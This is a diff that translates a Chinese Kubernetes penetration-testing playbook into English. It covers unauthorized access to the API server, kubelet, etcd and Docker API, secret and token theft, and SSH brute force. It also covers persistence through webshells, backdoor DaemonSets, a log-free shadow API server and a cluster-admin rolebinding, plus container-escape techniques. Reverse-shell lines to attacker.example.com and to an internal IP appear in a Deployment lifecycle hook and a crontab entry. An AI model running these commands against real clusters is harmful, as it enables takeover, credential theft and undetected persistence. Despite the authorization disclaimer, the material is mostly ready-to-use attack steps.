@@ -1,17 +1,17 @@
 ---
-title: "Kubernetes 攻击操作手册"
+title: "Kubernetes Attack Playbook"
 date: 2026-07-15
 tags: ["kubernetes", "cloud-native", "container-security", "penetration-testing"]
-summary: "一份 Kubernetes 渗透测试速查手册：从服务指纹识别、未授权访问（Dashboard/API Server/Kubelet/Etcd/Docker API），到拿到权限后的持久化、痕迹清理与权限下的容器逃逸技巧。"
+summary: "A Kubernetes penetration-testing quick-reference: service fingerprinting, unauthorized access (Dashboard/API Server/Kubelet/Etcd/Docker API), and post-access persistence, log cleanup, and privileged-container escape techniques."
 toc: true
 draft: false
 ---
 
-> 本文仅涵盖已获书面授权的安全测试场景，聚焦已广泛公开的 Kubernetes 常见配置错误类别（未授权访问、弱口令、组件暴露）。文中命令与 YAML 均为教学示例，敏感的内网域名/主机名/IP 已替换为占位符。
+> This article covers only scenarios with written authorization for security testing, and focuses on widely publicized categories of common Kubernetes misconfiguration (unauthorized access, weak credentials, exposed components). Commands and YAML in this article are teaching examples; sensitive internal domains/hostnames/IPs have been replaced with placeholders.
 
-## 常见服务指纹与内网扫描
+## Common Service Fingerprints and Internal Network Scanning
 
-Kubernetes 架构下常见的开放服务指纹如下：
+Common open-service fingerprints under a Kubernetes architecture:
 
 - kube-apiserver: 6443, 8080
 - kubectl proxy: 8080, 8081
@@ -20,34 +20,33 @@ Kubernetes 架构下常见的开放服务指纹如下：
 - etcd: 2379, 2380
 - kubeflow-dashboard: 8080
 
-我们可以对局域网整个范围进行端口扫描，重点探测这些端口。局域网地址范围分三类：
+We can port-scan the entire LAN range, focusing on these ports. LAN address ranges fall into three classes:
 
-- C 类：192.168.0.0 - 192.168.255.255
-- B 类：172.16.0.0 - 172.31.255.255
-- A 类：10.0.0.0 - 10.255.255.255
+- Class C: 192.168.0.0 - 192.168.255.255
+- Class B: 172.16.0.0 - 172.31.255.255
+- Class A: 10.0.0.0 - 10.255.255.255
 
-## 初始访问
+## Initial Access
 
-### K8s Dashboard未授权访问
+### K8s Dashboard Unauthorized Access
 
-访问k8s
-dashboard，看面板左下角是否有"跳过"选项，如面板有"跳过"选项则登陆dashboard，登陆后看是否有权限操作整个集群。或访问/ui通过未授权访问进入dashboard。
+Open the k8s dashboard and check whether there's a "Skip" option in the bottom-left corner of the panel; if so, log in via Skip and check whether you have permission to operate the whole cluster. Alternatively, visit `/ui` to reach the dashboard via unauthorized access.
 
 ![](/img/research/kubernetes-attack-playbook/image1.png)
 
 ![](/img/research/kubernetes-attack-playbook/image2.png)
 
-### K8s API Server未授权访问
+### K8s API Server Unauthorized Access
 
-使用端口扫描工具批量扫描8080端口和6443端口
+Use a port scanner to batch-scan ports 8080 and 6443.
 
-**测试思路**：扫描常见K8s端口，验证是否为未授权
+**Test approach**: scan common K8s ports and verify whether they're unauthorized.
 
-依赖权限：网络可达
+Required access: network reachability.
 
-参考工具：Nmap、TXportmap
+Reference tools: Nmap, TXportmap.
 
-测试过程：
+Test procedure:
 
 Nmap 192.168.0.1/24 --p 8080,6443
 
@@ -65,308 +64,305 @@ Nmap 192.168.0.1/24 --p 8080,6443
                    
   ---------------- ------------------------------------------------------
 
-对于开放8080端口的ip，执行curl <http://ip:8080>
+For any IP with port 8080 open, run `curl <http://ip:8080>`.
 
-返回如下结果证明存在未授权访问
+The following response confirms unauthorized access exists:
 
 ![](/img/research/kubernetes-attack-playbook/image3.png)
 
-例：发现8081端口为k8s的api server
+Example: port 8081 found to be the k8s API server.
 
 ![](/img/research/kubernetes-attack-playbook/image4.png)
 
-使用工具Kubectl 连接控制k8s集群
+Use Kubectl to connect to and control the k8s cluster:
 
 Kubectl -s xx.xx.xx.xx:8081 get namespaces
 
 ![](/img/research/kubernetes-attack-playbook/image5.png)
 
-访问6443端口，查看是否存在未授权
+Access port 6443 and check whether it's unauthorized.
 
-查看pods：https://ip:6443/pods
+View pods: https://ip:6443/pods
 
 ![](/img/research/kubernetes-attack-playbook/image6.png)
 
 ![](/img/research/kubernetes-attack-playbook/image7.png)
 
-如上，存在未授权访问。
+As shown above, unauthorized access exists.
 
-访问/api/v1/namespces/kube-system/secrets获得token，从而控制整个集群
+Visit `/api/v1/namespces/kube-system/secrets` to obtain a token, thereby gaining control of the entire cluster.
 
 kubectl -s "https://ip:6443/" --insecure-skip-tls-verify
 --token="" get ns -o wide
 
-### Kubelet未授权访问
+### Kubelet Unauthorized Access
 
-批量扫描开放了10250端口的IP
+Batch-scan IPs with port 10250 open:
 
 Nmap 192.168.0.1/24 --p 10250
 
-对于开放10250的IP
+For an IP with 10250 open:
 
-curl https://192.168.20.121:10250/pods -k（不存在未授权访问）
+curl https://192.168.20.121:10250/pods -k (not unauthorized in this case)
 
 ![](/img/research/kubernetes-attack-playbook/image8.png)
 
-浏览器访问https://192.168.xx.xx250/pods
+Visit https://192.168.xx.xx:10250/pods in a browser.
 
-可以看到以下接口信息，证明存在未授权访问
+The following interface information confirms unauthorized access exists:
 
 ![](/img/research/kubernetes-attack-playbook/image9.png)
 
-可以使用工具kubeletctl进行利用执行命令
+You can use the tool `kubeletctl` to execute commands.
 
-查看pods信息：./kubeletctl -s <ip> pods
+View pod information: `./kubeletctl -s <ip> pods`
 
 ![](/img/research/kubernetes-attack-playbook/image10.png)
 
-对指定容器进行命令执行
+Execute a command inside a specific container:
 
 ./kubeletctl --s <ip> -p <POD_name> -n <NAMESPACE_name> -c
 <CONTAINERS> exec "uname -a"
 
 ![](/img/research/kubernetes-attack-playbook/image11.png)
 
-获取当前pod下所有token
+Get all tokens under the current pod:
 
 ./kubeletctl_linux_amd64 -s 203.0.113.10 scan token
 
-获取集群地址
+Get the cluster address:
 
 ./kubeletctl_linux_amd64 -s 203.0.113.10 metrics|grep 6443
 
 ![](/img/research/kubernetes-attack-playbook/image12.png)
 
-使用token和api server地址控制整个集群
+Use the token and API server address to control the entire cluster:
 
 ./kubectl -s https://ip:6443/ --insecure-skip-tls-verify --token=""
 get nodes
 
-除了10250端口之后，k8s
-10255是只读端口，我们同样可以访问去看下是否存在一些敏感信息泄露（关注env和entrypoint）
+Besides port 10250, k8s port 10255 is a read-only port; we can likewise access it to check for sensitive information disclosure (pay attention to `env` and `entrypoint`).
 
 ![](/img/research/kubernetes-attack-playbook/image13.png)
 
-### Etcd未授权访问
+### Etcd Unauthorized Access
 
-批量扫描2379端口
+Batch-scan port 2379:
 
 Nmap 192.168.0.1/24 --p 2379
 
-对开放了2379端口的IP进行访问
+Access any IP with port 2379 open:
 
 curl http://ip:2379/version
 
 ![](/img/research/kubernetes-attack-playbook/image14.png)
 
-如上，存在未授权访问
+As shown above, unauthorized access exists.
 
-获取所有key：
+Get all keys:
 
 ./etcdctl --insecure-transport=false --insecure-skip-tls-verify
 --endpoints=https://ip:2379/ get / --prefix --keys-only | grep
 secrets/kube-system/clusterrole
 ![](/img/research/kubernetes-attack-playbook/image15.png)
 
-获取指定key的token：
+Get the token for a specific key:
 
 ./etcdctl --endpoints=http://ip:2379 get
 /registry/secrets/kube-system/clusterrole-aggregation-controller-token-knhrs
 
 ![](/img/research/kubernetes-attack-playbook/image16.png)
 
-复制出token
+Copy out the token.
 
 ![](/img/research/kubernetes-attack-playbook/image17.png)
 
-然后加上token，对api server进行集群控制
+Then add the token to gain cluster control via the API server:
 
 ./kubectl -s "https://ip:6443/" --insecure-skip-tls-verify
 --token="" get nodes
 
-这里可以[配置客户端配置文件](#客户端生成config文件)，将token和api
-server地址写进配置文件中，从而简化命令进行执行。
+At this point you can [set up a client config file](#client-side-config-file-generation), writing the token and API server address into the config file to simplify subsequent commands.
 
-简化后：./kubectl get nodes
+Simplified: `./kubectl get nodes`
 
-### Docker API未授权访问
+### Docker API Unauthorized Access
 
-批量扫描2375端口
+Batch-scan port 2375.
 
-访问http://ip:2375/version，出现如下数据存在未授权访问
+Visit http://ip:2375/version — the following data appearing confirms unauthorized access exists:
 
 ![](/img/research/kubernetes-attack-playbook/image18.png)
 
-远程对被攻击主机的docker容器进行操作
+Remotely operate the target host's docker containers:
 
 docker -H tcp://x.x.x.x:2375 images
 
 ![](/img/research/kubernetes-attack-playbook/image19.png)
 
-远程启动被攻击主机的docker容器，并且将该宿主机的根目录挂载到容器的/mnt目录下
+Remotely start a docker container on the target host, mounting the host's root directory into the container's `/mnt` directory:
 
 docker -H tcp://x.x.x.x:2375 run -it-v /:/mnt imageID /bin/bash
 
 ![](/img/research/kubernetes-attack-playbook/image20.png)
 
-### K8s config文件泄漏
+### K8s Config File Leakage
 
-当获取到宿主机root权限时，可在\~/.kube/config处获取到config文件
+Once you have root on the host, the config file can be obtained at `~/.kube/config`.
 
 ![](/img/research/kubernetes-attack-playbook/image21.png)
 
-利用config文件控制集群
+Use the config file to control the cluster:
 
 kubectl --kubeconfig config get pods
 
 ![](/img/research/kubernetes-attack-playbook/image22.png)
 
-### 私有镜像仓库暴露
+### Private Image Registry Exposure
 
-找到Harbor仓库，尝试通过默认用户名密码:admin/Harbor12345进行登录寻找镜像仓库
+Find the Harbor registry and try logging in with the default credentials `admin/Harbor12345` to look for image repositories.
 
-或注册通过harbor漏洞注册一个管理员权限用户
+Or register an admin-privileged user via a Harbor registration vulnerability.
 
 ![](/img/research/kubernetes-attack-playbook/image23.png)
 
-进入后台后，对其进行审计发现敏感信息。
+After reaching the admin console, audit it for sensitive information.
 
-## 执行
+## Execution
 
-### Kubectl进入容器
+### Entering a Container via Kubectl
 
-需要k8s存在api server未授权或者找到kube config文件
+Requires either an unauthorized API server or a kube config file.
 
-1.  存在api server未授权
+1.  API server is unauthorized:
 
 kubectl -s xx.xx.xx.xx:8080 exec -it test -- /bin/bash
 
-2）有kube config文件
+2) Have a kube config file:
 
 kubectl --kubeconfig config exec -it test -- /bin/bash
 
 ![](/img/research/kubernetes-attack-playbook/image24.png)
 
-### 暴力破解
+### Brute Force
 
-1）找到api server的IP进行端口扫描
+1) Find the API server's IP and port-scan it.
 
 ![](/img/research/kubernetes-attack-playbook/image25.png)
 
-2）横向扫描开放了22端口的机器，进行爆破
+2) Laterally scan for machines with port 22 open, then brute-force them.
 
-使用hydra爆破ssh弱口令
+Use hydra to brute-force weak SSH credentials:
 
 https://github.com/vanhauser-thc/thc-hydra
 
 hydra -L logins.txt -P passwords.txt ssh://ip
 
-### 通过NodePod访问Service
+### Accessing a Service via NodePort
 
-扫描k8s nodeport的端口
+Scan the k8s NodePort port range.
 
-"默认情况下，K8s集群NodePort分配的端口范围为：30000-32767
+"By default, K8s cluster NodePort allocates ports in the range: 30000-32767"
 
-Txportmap -i <ip段> -p 30000-32767
+Txportmap -i <ip range> -p 30000-32767
 
-### K8S secrets收集
+### K8s Secrets Collection
 
 **kubectl get secrets -A**
 
 ![](/img/research/kubernetes-attack-playbook/image26.png)
 
-读取secret内容
+Read a secret's contents:
 
 ./kubectl get secret <sectret_name> -n <namespace_name> -o yaml
 
-**利用**secret**进入harbor镜像仓库：**
+**Using a secret to access the Harbor registry:**
 
-从secrets中找到Harbor仓库
+Find the Harbor registry among the secrets.
 
-获得Master权限时
+Once you have Master-level access:
 
 ./kubectl get secrets -A | grep harbor
 
 ![](/img/research/kubernetes-attack-playbook/image27.png)
 
-读取secrets信息
+Read the secret's information:
 
 ./kubectl get secret <sectret_name> -n <namespace_name> -o yaml
 
 ![](/img/research/kubernetes-attack-playbook/image28.png)
 
-将所指数据到<https://jwt.io/>进行解密
+Decrypt the extracted data at <https://jwt.io/>.
 
 ![](/img/research/kubernetes-attack-playbook/image29.png)
 
-### ConfigMaps获取
+### ConfigMap Retrieval
 
-容器内：./cdk run k8s-configmap-dump auto
+Inside the container: `./cdk run k8s-configmap-dump auto`
 
-集群内：./kubectl get configmaps -A
+Inside the cluster: `./kubectl get configmaps -A`
 
-将所有配置输出到文件configmaps.txt
+Dump all configuration to the file `configmaps.txt`.
 
 ![](/img/research/kubernetes-attack-playbook/image30.png)
 
-容器内
+Inside the container:
 
 ![](/img/research/kubernetes-attack-playbook/image31.png)
 
-失败时
+On failure:
 
 ![](/img/research/kubernetes-attack-playbook/image32.png)
 
-### ServiceAccount凭据泄露
+### ServiceAccount Credential Leakage
 
-当获得一个pod权限时，尝试直接读取token
+Once you have access to a pod, try reading the token directly:
 
 cat /var/run/secrets/kubernetes.io/serviceaccount/token
 
 ![](/img/research/kubernetes-attack-playbook/image33.png)
 
-### 窃取凭证攻击其他应用
+### Stealing Credentials to Attack Other Applications
 
-通过容器内信息收集得到的secrets或其他配置文件，找到其他服务的账号密码，如mysql,sqlserver等数据库的账号密码。
+Use secrets or other config files gathered from inside the container to find credentials for other services, such as MySQL, SQL Server, and other database accounts.
 
-如文件：/app/resources/application-local.yml
+For example, the file: `/app/resources/application-local.yml`
 
-### 应用层API凭据泄露
+### Application-Layer API Credential Leakage
 
-容器内：
+Inside the container:
 
-Cdk会根据ak的特征获取证书文件
+Cdk fetches credential files based on AK signatures:
 
 ./cdk run ak-leakage <app_dir>
 
 ![](/img/research/kubernetes-attack-playbook/image34.png)
 
-集群搜索secrets：
+Search the cluster for secrets:
 
 ./kubectl get secrets --namespaces
 
 ![](/img/research/kubernetes-attack-playbook/image35.png)
 
-### 云产品AK泄露
+### Cloud-Provider AK Leakage
 
 Xxxxx
 
-### 利用K8S 准入控制器窃取信息
+### Stealing Information via the K8s Admission Controller
 
 XXXXX
 
-## 持久化
+## Persistence
 
-### 部署WebShell或内存马
+### Deploying a Webshell or Memory-Resident Shell
 
-云原生工具CDK：
+The cloud-native tool CDK:
 
 <https://github.com/cdk-team/CDK/releases/>
 
-1、部署webshell
+1. Deploying a webshell.
 
-当获取到容器权限时，可生成接受随机POST参数的PHP或JSP
-webshell写入web目录下。
+Once you have container access, you can generate a PHP or JSP webshell that accepts a random POST parameter and write it into the web directory.
 
 Usage:
 
@@ -378,15 +374,15 @@ Example:
 
 ![](/img/research/kubernetes-attack-playbook/image36.png)
 
-使用 curl -d "cdk_sgrytry=system(whoami)" 连接webshell.
+Connect to the webshell with `curl -d "cdk_sgrytry=system(whoami)"`.
 
-使用冰蝎注入内存马：
+Inject a memory-resident shell with Behinder (冰蝎):
 
 ![](/img/research/kubernetes-attack-playbook/image37.png)
 
-### 部署后门Pod
+### Deploying a Backdoor Pod
 
-通过daemonset将用户指定的后门镜像部署到每个node。
+Deploy a user-specified backdoor image to every node via a DaemonSet.
 
 Usage:
 
@@ -395,16 +391,15 @@ Usage:
 
 Example:
 
-部署一个 pod image:ubuntu 到每一个节点:
+Deploy a pod running `image:ubuntu` to every node:
 
 ./cdk run k8s-backdoor-daemonset default ubuntu
 
 ![](/img/research/kubernetes-attack-playbook/image38.jpeg)
 
-### 部署影子K8s api-server
+### Deploying a Shadow K8s API Server
 
-部署一个shadow apiserver，该api server具有和集群中现存的api
-server一致的功能，同时开启了全部K8s管理权限，接受匿名请求且不保存审计日志。便于攻击者无痕迹的管理整个集群以及下发后续渗透行动。
+Deploy a shadow API server with functionality identical to the cluster's existing API server, while enabling full K8s admin privileges, accepting anonymous requests, and keeping no audit log. This lets an attacker administer the entire cluster and stage follow-on actions without leaving a trace.
 
 Usage:
 
@@ -417,13 +412,13 @@ Example:
 
 ![](/img/research/kubernetes-attack-playbook/image39.jpeg)
 
-### 部署K8s CronJob
+### Deploying a K8s CronJob
 
-### 方法一
+### Method 1
 
-使用yaml创建，cronjob.yaml内容如下
+Create via YAML; `cronjob.yaml` content as follows.
 
-image需要修改
+`image` needs to be changed.
 
 ```yaml
 apiVersion: batch/v1beta1
@@ -451,15 +446,15 @@ spec:
 
 ![](/img/research/kubernetes-attack-playbook/image40.png)
 
-删除cronjob
+Delete the cronjob:
 
 ./kubectl delete cronjob <NAME_name>
 
 ![](/img/research/kubernetes-attack-playbook/image41.png)
 
-### 方法二
+### Method 2
 
-部署K8s CronJob定时创建用户指定的image并运行cmd。
+Deploy a K8s CronJob that periodically creates a user-specified image and runs a cmd.
 
 Usage:
 
@@ -472,13 +467,13 @@ Example:
 
 ![](/img/research/kubernetes-attack-playbook/image42.jpeg)
 
-执行后
+After execution:
 
 ![](/img/research/kubernetes-attack-playbook/image43.jpeg)
 
-### 部署静态pods
+### Deploying Static Pods
 
-1、创建一个 YAML 文件，并保存在 web 服务上，为 kubelet 生成一个 URL。
+1. Create a YAML file and host it on a web server, generating a URL for the kubelet.
 
 ```yaml
 apiVersion: v1
@@ -497,33 +492,32 @@ spec:
       protocol: TCP
 ```
 
-2、通过在选择的节点上使用 --manifest-url=<manifest-url> 配置运行
-kubelet。 在 Fedora 添加下面这行到 /etc/kubernetes/kubelet ：
+2. Run kubelet on the chosen node configured with `--manifest-url=<manifest-url>`. On Fedora, add the following line to `/etc/kubernetes/kubelet`:
 
 KUBELET_ARGS="--cluster-dns=10.254.0.10 --cluster-domain=kube.local
 --manifest-url=<manifest-url>"
 
-3、重启 kubelet。在 Fedora 上，你将运行如下命令：
+3. Restart kubelet. On Fedora, you'd run:
 
-*\# 在 kubelet 运行的节点上执行以下命令*
+*# Run the following command on the node where kubelet runs*
 
 systemctl restart kubelet
 
-### 覆写容器生命周期hooks
+### Overwriting Container Lifecycle Hooks
 
-创建容器的yaml中在poststart和prestop,分别在容器创建后执行和容器销毁前执行
+In the container-creation YAML, `poststart` and `prestop` execute after container creation and before container teardown, respectively.
 
 [root@SHE-L0563377 tmp]# vim tomcat-deploy1.yaml
 
 ```yaml
 apiVersion: apps/v1
-kind: Deployment  # 确保在任何时候都有特定数量的 Pod 副本处于运行状态
+kind: Deployment  # ensures a specific number of Pod replicas are running at all times
 metadata:
   name: tomcat
   labels:
     k8s-app: tomcat-demo
 spec:
-  replicas: 3  # 指定 Pod 副本数量
+  replicas: 3  # specify the number of Pod replicas
   selector:
     matchLabels:
       app: tomcat
@@ -541,10 +535,10 @@ spec:
         lifecycle:
           postStart:
             exec:
-              command: ["bash"]  # 反弹 Shell
+              command: ["bash"]  # reverse shell
               args: ["-c", "bash -i >& /dev/tcp/attacker.example.com/11111 0>&1"]
         securityContext:
-          privileged: true  # 特权模式
+          privileged: true  # privileged mode
         volumeMounts:
         - mountPath: /host
           name: host-root
@@ -555,18 +549,17 @@ spec:
           type: Directory
 ```
 
-### 修改核心组件访问权限
+### Modifying Core Component Access Permissions
 
-通过configmap修改kubelet使其关闭认证并允许匿名访问，或暴露API
-Server未授权的HTTP端口。
+Modify the kubelet via a ConfigMap to disable authentication and allow anonymous access, or expose an unauthorized HTTP port on the API Server.
 
-### Daemonsets deployments
+### DaemonSets / Deployments
 
-控制DaemonSets和Deployments在集群中部署远控容器/pod
+Use DaemonSets and Deployments to deploy remote-control containers/pods across the cluster.
 
 ./ kubectl apply -f nginxdockerSock.yaml
 
-image需要修改
+`image` needs to be changed.
 
 ```yaml
 apiVersion: apps/v1
@@ -611,15 +604,15 @@ spec:
 
 ![](/img/research/kubernetes-attack-playbook/image44.png)
 
-### 使用恶意镜像
+### Using a Malicious Image
 
-方法一：在dockerfile中加入额外的恶意指令层来执行恶意代码
+Method 1: add an extra malicious instruction layer to the Dockerfile to execute malicious code.
 
-方法二：直接编辑原始镜像的文件层，将镜像中原始的可执行文件或链接库文件替换为精心构造的后门文件之后再次打包成新的镜像
+Method 2: directly edit the base image's file layers, replacing the original executable or library files with a carefully crafted backdoored file, then repackage into a new image.
 
 ![](/img/research/kubernetes-attack-playbook/image45.png)
 
-修改Dockerfile文件
+Modify the Dockerfile:
 
 cat /root/aaa/Dockerfile
 
@@ -629,20 +622,20 @@ cat /root/aaa/Dockerfile
 
 ![](/img/research/kubernetes-attack-playbook/image46.png)
 
-### K8s Rolebinding添加用户权限
+### K8s RoleBinding to Add User Privileges
 
 ./kubectl create rolebinding superbackdoor --clusterrole=cluster-admin
 --serviceaccount default:superbackdoor
 
 ![](/img/research/kubernetes-attack-playbook/image47.png)
 
-## 容器逃逸
+## Container Escape
 
-### 利用K8S漏洞提权逃逸
+### Exploiting K8s Vulnerabilities for Privilege Escalation / Escape
 
-CVE-2021-25741条件：
+CVE-2021-25741 conditions:
 
-有创建pod的权限，kubelet在漏洞影响范围内
+Permission to create pods, and the kubelet is within the affected version range.
 
 Vulnerable versions of the kubelet:
 
@@ -656,95 +649,90 @@ v1.20.0 - v1.20.10
 
 https://github.com/Betep0k/CVE-2021-25741
 
-### 通过内核漏洞提权逃逸
+### Privilege Escalation / Escape via Kernel Vulnerabilities
 
-容器共享宿主机内核，因此我们可以使用宿主机的内核漏洞进行容器逃逸，比如通过内核漏洞进入宿主机内核并更改当前容器的namespace，在历史内核漏洞导致的容器逃逸当中最广为人知的便是脏牛漏洞（CVE-2016-5195）了。
+Containers share the host kernel, so a host kernel vulnerability can be used to escape the container — for example, entering the host kernel via a kernel vulnerability and changing the current container's namespace. The best-known historical example of container escape via a kernel vulnerability is Dirty COW (CVE-2016-5195).
 
-同时，近期还有一个比较出名的内核漏洞是
-CVE-2020-14386，也是可以导致容器逃逸的安全问题。
+More recently, another well-known kernel vulnerability, CVE-2020-14386, can also lead to container escape.
 
-这些漏洞的POC 和
-EXP都已经公开，且不乏有利用行为，但同时大部分的EDR和HIDS也对EXP的利用具有检测能力，这也是利用内核漏洞进行容器逃逸的痛点之一。
+The POCs and EXPs for these vulnerabilities are public and have seen real-world exploitation, but most EDR and HIDS products can also detect exploitation of these EXPs — one of the pain points of using kernel vulnerabilities for container escape.
 
-### 使用CDK尝试一键逃逸
+### Attempting One-Click Escape with CDK
 
 ./cdk auto-escape id
 
-失败时
+On failure:
 
 ![](/img/research/kubernetes-attack-playbook/image48.png)
 
-### 特权容器内利用挂载逃逸
+### Mount-Based Escape from a Privileged Container
 
-### 挂载了设备进行逃逸
+### Escape via a Mounted Device
 
-首先在privileged特权容器内fdisk -l
-查看宿主机磁盘情况，如有回显则确认在privileged特权容器内；
+First, run `fdisk -l` inside the privileged container to check the host's disk layout; if there's output, this confirms you're inside a privileged container.
 
-然后，将宿主机的根目录挂载到容器内部去，进而操作宿主机任意文件，如crontab
-config file,或者 /root/.ssh/authorized_keys, /root/.bashrc等，实现逃逸
+Then mount the host's root directory into the container, giving you access to arbitrary host files — such as the crontab config file, `/root/.ssh/authorized_keys`, `/root/.bashrc`, etc. — to achieve escape.
 
-### 挂载了宿主机/etc目录
+### Host `/etc` Directory Mounted
 
-宿主机如果以特权模式启动容器，可以在该容器内部进行逃逸
+If the host started the container in privileged mode, you can escape from inside that container.
 
 ./cdk run mount-disk
 
 ![](/img/research/kubernetes-attack-playbook/image49.jpeg)
 
-etc目录最简单的利用方式就是写入crontab了
+The simplest way to exploit an `/etc` mount is to write to crontab:
 
 echo "*/1 * * * * root /bin/bash -i >& /dev/tcp/172.17.0.6/10000
 0>&1" >> /mnt/crontab
 
-然后等待反弹shell就行
+Then just wait for the reverse shell.
 
-失败时
+On failure:
 
 ![](/img/research/kubernetes-attack-playbook/image50.png)
 
-### 挂载了宿主机cgroup目录
+### Host `cgroup` Directory Mounted
 
-宿主机cgroup目录挂载到容器内，通过劫持宿主机cgroup的release_agent文件，通过linux
-cgroup notify_on_release机制触发shellcode执行，完成逃逸。
+With the host's cgroup directory mounted into the container, escape is achieved by hijacking the host cgroup's `release_agent` file, triggering shellcode execution via the Linux cgroup `notify_on_release` mechanism.
 
 ./cdk run mount-cgroup "<shell-cmd>"
 
-此命令无回显
+This command produces no output.
 
 ![](/img/research/kubernetes-attack-playbook/image51.jpeg)
 
-### 重写Cgroup以访问设备
+### Rewriting Cgroup to Access Devices
 
-重写当前容器内的 /sys/fs/cgroup/devices/devices.allow，逃逸特权容器访问宿主机内的文件。
+Rewrite the current container's `/sys/fs/cgroup/devices/devices.allow` to escape a privileged container and access host files.
 
 ./cdk run rewrite-cgroup-devices
 
-失败时：
+On failure:
 
 ![](/img/research/kubernetes-attack-playbook/image52.png)
 
-### 挂载宿主机/Proc文件系统
+### Host `/proc` Filesystem Mounted
 
-find / -name proc找到挂载的proc目录，未找到则无法逃逸
+`find / -name proc` to locate the mounted proc directory; if not found, escape isn't possible this way.
 
-找到后使用cdk执行命令
+Once found, use cdk to execute a command:
 
 ./cdk run mount-procfs <proc-dir> "<shell-cmd>"
 
-手动写shell：
+Writing the shell manually:
 
-确定容器overlay位置
+Determine the container's overlay location:
 
 /data/docker/overlay2/d7f802561c9efea4b256201d411043b873691c2a1359ef978b32db1fee6d5d72/merged/
 
 ![](/img/research/kubernetes-attack-playbook/image53.emf)
 
-开始写入shell
+Start writing the shell:
 
 ![](/img/research/kubernetes-attack-playbook/image54.emf)
 
-把命令写进到core_pattern中
+Write the command into `core_pattern`:
 
 echo -e
 "|/data/docker/overlay2/d7f802561c9efea4b256201d411043b873691c2a1359ef978b32db1fee6d5d72/merged/tmp/1.py
@@ -752,7 +740,7 @@ echo -e
 
 ![](/img/research/kubernetes-attack-playbook/image55.emf)
 
-编译一个异常的程序
+Compile a crashing program:
 
 #include <stdio.h>
 
@@ -768,110 +756,108 @@ return 0;
 
 }
 
-可以通过在容器上编译，如果容器内部不存在gcc这种编译工具可以在自己的电脑上编译然后复制上去。
+You can compile this inside the container; if there's no gcc-style toolchain in the container, compile it on your own machine first and copy it over.
 
 ![](/img/research/kubernetes-attack-playbook/image56.emf)
 
-这边有几个需要注意的是core_pattern内部是没有环境变量的，所以我们所有的命令必须接上全部的路径不要去省略，不然是找不到执行的文件的。
+One thing to watch for here: `core_pattern` has no environment variables available, so every command must use the full path — don't abbreviate, or the executable won't be found.
 
-### 挂载了宿主机LXCFS目录包含CGOURP
+### Host LXCFS Directory (Containing CGROUP) Mounted
 
-当POD挂载了LXCFS目录包含CGOURP目录，并且对CGROUP有写权限。
+When a POD has the LXCFS directory mounted (containing the CGROUP directory), and has write access to CGROUP.
 
-通过mount命令查看是否存在lxcfs
+Check whether lxcfs is present via the mount command:
 
 mount|grep lxcfs
 
 ![](/img/research/kubernetes-attack-playbook/image57.emf)
 
-如果没有mount命令也可以看/proc/1/mountinfo
+If the mount command isn't available, you can also check `/proc/1/mountinfo`.
 
 ![](/img/research/kubernetes-attack-playbook/image58.emf)
 
 ![](/img/research/kubernetes-attack-playbook/image59.emf)
 
-/data/test/lxcfs/cgroup/devices/ 下有设备的cgroup
+`/data/test/lxcfs/cgroup/devices/` contains device cgroups.
 
-找到我们当前主机的cgroup地址
+Find our current host's cgroup address.
 
 ![](/img/research/kubernetes-attack-playbook/image60.emf)
 
-我们把device.allow设置容器允许访问设备
+Set device.allow to permit the container to access the device:
 
 echo a > cgroup/devices/kubepods/XXXXX/devices.allow
 
-然后寻找mountinfo中挂载/etc/目录的node节点这边是253,2
+Then find the node entry mounting the `/etc/` directory in mountinfo — here it's 253,2.
 
 ![](/img/research/kubernetes-attack-playbook/image61.emf)
 
-然后运行debugfs test b 253
-1然而在实际运行的时候发现失败了，后面发现debugfs命令运行的时候无法打开filesystem
+Then run `debugfs test b 253 1` — however in practice this failed; it turned out debugfs couldn't open the filesystem.
 
 ![](/img/research/kubernetes-attack-playbook/image62.emf)
 
-重新测试发现我们当前的centos测试文件系统的问题，换一个系统重复上述过程运行debugfs发现我们成功看到宿主机的文件系统了，那么通过修改宿主机文件系统就可以实现容器逃逸了。
+Retesting revealed it was an issue with our CentOS test filesystem specifically; switching to a different OS and repeating the process, debugfs successfully showed the host filesystem — meaning we could achieve container escape by modifying the host filesystem.
 
 ![](/img/research/kubernetes-attack-playbook/image63.emf)
 
-失败时：
+On failure:
 
 ![](/img/research/kubernetes-attack-playbook/image64.png)
 
-### 利用linux capability逃逸
+### Escape via Linux Capabilities
 
 ./cdk_linux_amd64 evaluate
 
-查询到有特殊capability权限
+Discovering special capability privileges:
 
 ![](/img/research/kubernetes-attack-playbook/image65.png)
 
 ![](/img/research/kubernetes-attack-playbook/image66.png)
 
-### 利用挂载的docker.sock逃逸
+### Escape via a Mounted docker.sock
 
-找到被挂载的docker.sock文件
+Find the mounted docker.sock file:
 
 find / -name "docker.sock"
 
-扫描宿主机2375端口开启且未授权，可以尝试用docker客户端进行访问
+If the host's port 2375 is open and unauthorized, try accessing it with the docker client.
 
 ![](/img/research/kubernetes-attack-playbook/image67.emf)
 
-利用-H参数建立连接docker -H xxxxx:2375
+Establish a connection with the `-H` flag: `docker -H xxxxx:2375`
 
 ![](/img/research/kubernetes-attack-playbook/image68.emf)
 
-下载docker二进制文件，docker二进制是golang编写的所以我们完全不用担心这个文件的依赖问题。
+Download the docker binary — since it's written in Go, we don't need to worry about dependency issues.
 
-在别的机器上准备好这个二进制文件
+Prepare this binary on another machine:
 
 ![](/img/research/kubernetes-attack-playbook/image69.emf)
 
-我们可以直接用docker执行命令了，这边由于我在创建靶场的时候默认把docker
-sock放在了/var/run/docker.sock上，如果碰到一些特殊的环境我们可能不是这个文件，就需要使用-H命令来指定
+We can now execute commands directly with docker. Since I placed the docker sock at `/var/run/docker.sock` by default when building the test range, in a different environment the path may differ, requiring `-H` to specify it.
 
 ./docker -H unix:///var/run/docker.sock ps
 
 ![](/img/research/kubernetes-attack-playbook/image70.emf)
 
-这边我们就直接使用吧
+We'll just use it directly here:
 
 ![](/img/research/kubernetes-attack-playbook/image71.emf)
 
-然后可以借此启动一个挂载宿主机根目录的特权容器，完成简单逃逸：
+Then we can use this to start a privileged container with the host root directory mounted, achieving a simple escape:
 
 ./docker run -it -v /:/host --privileged --name=sock-test ubuntu
 /bin/bash
 
 ![](/img/research/kubernetes-attack-playbook/image72.emf)
 
-也可使用 cdk
+CDK can also be used for this:
 
 Link: https://github.com/Xyntax/CDK/wiki/Exploit:-docker-sock-check
 
 https://github.com/Xyntax/CDK/wiki/Exploit:-docker-sock-pwn
 
-### K8S RoleBinding添加用户权限
+### K8S RoleBinding to Add User Privileges
 
 ./kubectl create sa superbackdoor
 
